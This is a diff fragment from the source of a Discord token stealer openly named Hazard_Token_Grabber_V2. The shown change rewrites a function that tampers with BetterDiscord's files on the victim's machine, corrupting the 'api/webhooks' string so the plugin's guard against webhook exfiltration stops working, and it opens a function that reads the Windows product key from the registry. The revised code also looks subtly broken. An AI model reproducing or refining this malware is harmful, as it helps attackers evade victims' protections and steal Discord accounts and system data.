@@ -138,14 +138,16 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def bypassBetterDiscord(self):
-        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
-            bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-            with open(bd, "rt", encoding="cp437") as f:
-                content = f.read()
-                content2 = content.replace("api/webhooks", "RdimoTheGoat")
-            open(bd, "w").close()
-            with open(bd, "wt", encoding="cp437") as f:
-                f.write(content2)
+        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+        if os.path.exists(bd):
+            x = "api/webhooks"
+            with open(bd, "r+", errors="ignore") as f:
+                l = f.readlines()
+                for i in l:
+                    if x in i:
+                        Replacement = i.replace(x, "RdimoTheGoat")
+                        l = Replacement
+                f.writelines(l)
 
     def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
         def strToInt(x):
